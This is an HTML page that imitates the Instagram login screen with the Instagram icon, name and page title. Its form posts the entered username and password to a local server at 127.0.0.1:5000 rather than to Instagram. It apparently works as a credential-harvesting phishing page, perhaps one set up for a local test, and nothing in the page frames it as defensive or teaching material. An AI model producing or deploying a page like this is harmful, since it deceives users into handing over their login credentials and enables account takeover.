<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/png">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #fdfcfb, #e2d1c3);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 350px;
            max-width: 100%;
            text-align: center;
            position: relative;
            z-index: 1;
        }
        .logo {
            width: 150px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }
        label {
            display: block;
            margin-bottom: 5px;
            text-align: left;
            color: #333;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            box-sizing: border-box; /* Ensures padding is included in width */
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            border: none;
            color: #ffffff;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            box-sizing: border-box; /* Ensures padding is included in width */
        }
        button:hover {
            background-color: #2a80d2;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
        }
        .footer a {
            color: #00376b;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .background-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://images.unsplash.com/photo-1506748686214e9df14f8e8d65e0caa4?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwyMjA2MTV8MHwxfGFsbHwxfHx8fHx8fHwxNjkyMzMwMTk5&ixlib=rb-1.2.1&q=80&w=1080');
            background-size: cover;
            background-position: center;
            z-index: 0;
        }
    </style>
</head>
<body>
    <div class="background-image"></div>
    <div class="container">
        <!-- Instagram logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <h1>Instagram</h1>
        <form id="loginForm" action="http://127.0.0.1:5000/login" method="POST">
            <label for="username">Phone number, username, or email</label>
            <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>
